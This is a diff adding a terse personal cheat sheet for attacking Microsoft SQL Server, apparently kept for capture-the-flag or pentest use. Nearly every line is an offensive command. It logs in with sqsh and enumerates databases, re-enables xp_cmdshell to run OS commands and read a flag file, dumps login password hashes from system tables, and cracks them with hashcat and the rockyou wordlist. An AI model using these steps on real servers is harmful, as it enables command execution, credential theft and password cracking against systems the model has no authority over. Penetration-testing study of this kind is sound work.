@@ -1,0 +1,36 @@
+### mssql ###
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+
+
+## sqsh
+sqsh -S HOST -U USER -P PASS
+
+# cmd
+1> SELECT name FROM sys.databases;
+2> go
+
+1> SELECT * FROM BDD.dbo.TABLE;
+2> go
+
+# shell
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+1> xp_cmdshell 'whoami'
+1> xp_cmdshell 'dir c:\Users\'
+1> xp_cmdshell 'type c:\Users\xxx\flag.txt'
+
+
+# user list+hash
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date,
+case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status
+from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+
+hashcat -m 1731 mssql.hash    ~/perso/secu/dict/rockyou.txt --force		# start with 0x02000
+
+
+
+
+
